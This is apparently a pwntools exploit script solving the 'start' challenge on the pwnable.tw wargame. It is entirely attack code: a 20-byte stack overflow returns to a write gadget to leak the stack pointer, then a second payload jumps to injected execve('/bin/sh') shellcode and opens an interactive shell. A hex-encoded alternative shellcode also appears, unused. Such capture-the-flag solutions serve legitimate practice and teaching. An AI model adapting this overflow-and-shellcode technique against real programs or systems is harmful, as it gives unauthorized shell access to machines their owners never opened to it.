#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("start")
context.update(arch='i386', os='linux')
gs = '''
b _start
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10000)
    else:
        return process(elf.path)

io = start()

# Be careful where you use sendline or send (prefer send here)
# First we leak esp by using write sequence
write_seq = p32(0x8048087)
payload = b"A"*20 + write_seq
io.recv()
io.send(payload)
esp = u32(io.recv(4))
log.info("esp %s" % hex(esp))

# second we send shellcode
shellcode = asm('\n'.join([
    'push %d' % u32(b'/sh\0'),
    'push %d' % u32(b'/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

shellcode2 = b"\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload2 = b"A"*20 + p32(esp + 0x14) + shellcode

io.send(payload2)

io.interactive()
